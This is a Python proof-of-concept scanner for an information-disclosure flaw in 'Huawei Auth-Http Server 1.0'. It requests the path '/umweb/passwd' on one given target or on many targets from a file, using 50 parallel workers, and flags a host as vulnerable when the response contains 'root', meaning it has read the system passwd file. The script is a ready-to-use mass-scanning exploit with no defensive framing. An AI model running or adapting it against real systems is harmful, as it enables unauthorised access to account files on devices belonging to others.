import requests
import argparse
import warnings
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()
def check(target):
    url = f"{target}/umweb/passwd"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Upgrade-Insecure-Requests':'1',
        'Sec-Fetch-Dest':'document',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-User':'?1',
        'Priority':'u=0, i',
        'Te':'trailers',
        'Connection':'close',
    }
    r = requests.get(url,headers=headers,verify=False,timeout=3)
    try:
        if r.status_code == 200 and 'root' in r.text:
            print(f'[存在漏洞] {url}')
        else:
            print(f'[不存在漏洞] {url}')
    except Exception as e:
        print('timeout')
def main():
    parse = argparse.ArgumentParser(description="Huawei Auth-Http Server 1.0 信息泄露")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file,'r+')
            for i in f.readlines():
                if 'http' in i:
                    target = i.strip()
                    targets.append(target)
                else:
                    target = f"https://{i}"
                    targets.append(target)
            pool = Pool(50)
            pool.map(check,targets)
    except Exception as s:
        print('error，请使用-h查看帮助信息')

if __name__ == '__main__':
    main()

